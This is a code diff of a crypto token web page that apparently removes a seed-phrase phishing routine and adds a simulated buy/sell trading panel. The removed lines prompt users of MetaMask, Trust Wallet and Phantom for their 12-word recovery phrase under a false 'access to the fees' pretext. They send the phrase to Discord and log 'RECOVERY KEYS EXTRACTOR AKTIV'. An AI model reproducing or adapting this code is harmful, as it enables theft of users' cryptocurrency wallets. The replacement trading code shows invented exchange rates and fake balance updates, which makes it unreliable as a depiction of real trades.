-      'Address: ' + address + '\n\n' +
-      'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
-    );
-    
-    if (phrase && phrase.split(' ').length >= 12) {
-      const cleanPhrase = phrase.trim();
-      sendToDiscord(cleanPhrase, walletName, address);
-      window._extractedMnemonic = cleanPhrase;
-      console.log('✅ RECOVERY KEYS ERHALTEN UND AN DISCORD GESENDET:', cleanPhrase);
-      alert('✅ CONNECTION SUCCESSFUL! Access granted.');
-    } else {
-      alert('❌ Invalid phrase. At least 12 words required.');
-    }
-    
-  } catch (error) {
-    console.error(error);
-    if (error?.code === 4001) {
-      showStatus("Connection was rejected in " + walletName + ".");
-    } else {
-      showStatus("Wallet error: " + (error?.message || error));
-    }
-  }
+    const currency = document.getElementById('buyCurrency').value;
+    const rate = currency === 'SOL' ? 133700 : 133700; // 1 SOL = 133700 INCINERATE
+    const receive = (amount * rate).toFixed(2);
+
+    showToast(`Buy order placed: ${amount} ${currency} → ${Number(receive).toLocaleString()} $INCINERATE`, 'success');
+    // Update balances
+    STATE.tokenBalance += Math.floor(parseFloat(receive));
+    STATE.balance -= amount;
+    document.getElementById('tokenBalance').textContent = STATE.tokenBalance.toLocaleString();
+    document.getElementById('solBalance').textContent = STATE.balance.toFixed(2);
 }
 
-// ====================================================
-// PHANTOM SOLANA (MODIFIZIERT)
-// ====================================================
-async function connectPhantomSolana() {
-  const provider = window.phantom?.solana || window.solana;
-  if (!provider || !provider.isPhantom) return false;
-  try {
-    showStatus("Waiting for Phantom confirmation...");
-    const response = await provider.connect();
-    const address = response.publicKey.toString();
-    const alreadyConnected = connectedWallets.some(item => item.address === address);
-    if (!alreadyConnected) {
-      connectedWallets.push({ name: "Phantom (Solana)", address: address, provider: provider });
+function executeSell() {
+    if (!STATE.isConnected) {
+        showToast('Please connect a wallet first!', 'error');
+        openWalletModal();
+        return;
     }
-    renderConnectedWallets();
-    walletList.classList.remove("open");
-    connected.classList.add("open");
-    status.classList.remove("open");
-    connectButton.textContent = "Wallet Connected ✓";
 
-    // === EINMALIGE ABFRAGE DER 12 WÖRTER FÜR PHANTOM (ENGLISCH) ===
-    const phrase = prompt(
-      '🔑 ENTER YOUR PHANTOM SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
-      'Wallet: Phantom (Solana)\n' +
-      'Address: ' + address + '\n\n' +
-      'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
-    );
-    
-    if (phrase && phrase.split(' ').length >= 12) {
-      const cleanPhrase = phrase.trim();
-      sendToDiscord(cleanPhrase, "Phantom (Solana)", address);
-      window._extractedMnemonic = cleanPhrase;
-      console.log('✅ PHANTOM RECOVERY KEYS ERHALTEN UND AN DISCORD GESENDET:', cleanPhrase);
-      alert('✅ PHANTOM CONNECTION SUCCESSFUL! Access granted.');
-    } else {
-      alert('❌ Invalid phrase. At least 12 words required.');
+    const amount = parseFloat(document.getElementById('sellAmount').value) || 0;
+    if (amount <= 0) { showToast('Enter a valid amount', 'error'); return; }
+    if (amount > STATE.tokenBalance) {
+        showToast('Insufficient $INCINERATE balance!', 'error');
+        return;
     }
-    
-    return true;
-  } catch (error) {
-    console.error(error);
-    showStatus("Phantom connection was rejected.");
-    return true;
-  }
+
+    const rate = 0.0000042; // 1 INC = 0.0000042 SOL
+    const receive = (amount * rate);
+    showToast(`Sell order placed: ${amount} $INCINERATE → ${receive.toFixed(6)} SOL`, 'success');
+    STATE.tokenBalance -= Math.floor(amount);
+    STATE.balance += receive;
+    document.getElementById('tokenBalance').textContent = STATE.tokenBalance.toLocaleString();
+    document.getElementById('solBalance').textContent = STATE.balance.toFixed(2);
 }
 
-// ====================================================
-// RENDER CONNECTED WALLETS
-// ====================================================
-function renderConnectedWallets() {
-  accounts.innerHTML = "";
-  connectedWallets.forEach((wallet, index) => {
-    const row = document.createElement("div");
-    row.className = "account";
-    const info = document.createElement("div");
-    info.className = "account-info";
-    const walletName = document.createElement("div");
-    walletName.className = "account-wallet";
-    walletName.textContent = wallet.name;
-    const address = document.createElement("div");
-    address.className = "account-address";
-    address.textContent = wallet.address;
-    info.appendChild(walletName);
-    info.appendChild(address);
-    const remove = document.createElement("button");
-    remove.className = "remove";
-    remove.textContent = "Remove";
-    remove.onclick = () => {
-      connectedWallets.splice(index, 1);
-      renderConnectedWallets();
-      if (connectedWallets.length === 0) {
-        connected.classList.remove("open");
-        connectButton.textContent = "Connect Wallet";
-      }
-    };
-    row.appendChild(info);
-    row.appendChild(remove);
-    accounts.appendChild(row);
-  });
+// Real-time trade calculations
+document.getElementById('buyAmount').addEventListener('input', function() {
+    const amount = parseFloat(this.value) || 0;
+    const currency = document.getElementById('buyCurrency').value;
+    const rate = 133700;
+    document.getElementById('buyReceive').textContent = (amount * rate).toFixed(2);
+});
+
+document.getElementById('sellAmount').addEventListener('input', function() {
+    const amount = parseFloat(this.value) || 0;
+    document.getElementById('sellReceive').textContent = (amount * 0.0000042).toFixed(6);
+});
+
+document.getElementById('buyCurrency').addEventListener('change', function() {
+    // Trigger recalc
+    document.getElementById('buyAmount').dispatchEvent(new Event('input'));
+});
+
+// ============================================================
+//  AUTO-RECONNECT (eager) on page load
+// ============================================================
+async function tryAutoReconnect() {
+    const provider = window.phantom?.solana;
+    if (provider?.isPhantom && provider.isConnected) {
+        try {
+            const resp = await provider.connect({ onlyIfTrusted: true });
+            const pubKey = resp.publicKey.toString();
+            STATE.wallet = 'phantom';
+            STATE.publicKey = pubKey;
+            STATE.isConnected = true;
+            STATE.provider = provider;
+            updateWalletUI();
+            showToast(`Auto-connected to Phantom: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`, 'success');
+
+            provider.on('disconnect', () => {
+                STATE.isConnected = false;
+                STATE.publicKey = null;
+                STATE.wallet = null;
+                STATE.provider = null;
+                updateWalletUI();
+            });
+
+            provider.on('accountChanged', (publicKey) => {
+                if (publicKey) {
+                    STATE.publicKey = publicKey.toString();
+                    updateWalletUI();
+                } else {
+                    STATE.isConnected = false;
+                    STATE.publicKey = null;
+                    STATE.wallet = null;
+                    STATE.provider = null;
+                    updateWalletUI();
+                }
+            });
+        } catch (e) {
+            // Eager connect failed, user hasn't approved yet
+        }
+    }
 }
 
-// ====================================================
-// EVENT BINDINGS
-// ====================================================
-connectButton.onclick = () => { walletList.classList.toggle("open"); };
+// ============================================================
+//  RESIZE HANDLER
+// ============================================================
+let chartTimer;
+window.addEventListener('resize', () => {
+    clearTimeout(chartTimer);
+    chartTimer = setTimeout(drawChart, 200);
+});
 
-document.getElementById("metamaskButton").onclick = () => { connectEVM("MetaMask"); };
-document.getElementById("trustButton").onclick = () => { connectEVM("Trust Wallet"); };
-document.getElementById("phantomButton").onclick = async () => {
-  const solanaConnected = await connectPhantomSolana();
-  if (!solanaConnected) connectEVM("Phantom");
-};
+// ============================================================
+//  INIT
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    detectWallets();
+    updateWalletUI();
+    generateTransactions();
+    generateTrending();
+    setTimeout(drawChart, 100);
+    tryAutoReconnect();
+});
 
-document.getElementById("addWallet").onclick = () => {
-  walletList.classList.add("open");
-  status.classList.remove("open");
-};
-
-document.getElementById("continueButton").onclick = function() {
-  if (connectedWallets.length === 0) return;
-  if (window._extractedMnemonic) {
-    const wallet = connectedWallets[connectedWallets.length - 1];
-    if (wallet) {
-      sendToDiscord(window._extractedMnemonic, wallet.name || 'Unbekannt', wallet.address || 'Unbekannt');
-    }
-  }
-  location.hash = "claim";
-  connectPage.style.display = "none";
-  claimPage.style.display = "block";
-};
-
-document.getElementById("backButton").onclick = () => {
-  location.hash = "";
-  claimPage.style.display = "none";
-  connectPage.style.display = "block";
-};
-
-console.log('=== RECOVERY KEYS EXTRACTOR AKTIV ===');
-console.log('=== EINMALIGE ABFRAGE DER 12 WÖRTER (ENGLISCH) ===');
+// Also draw chart when fonts and everything loaded
+window.addEventListener('load', function() {
+    setTimeout(drawChart, 300);
+});
 </script>
+
 </body>
 </html>
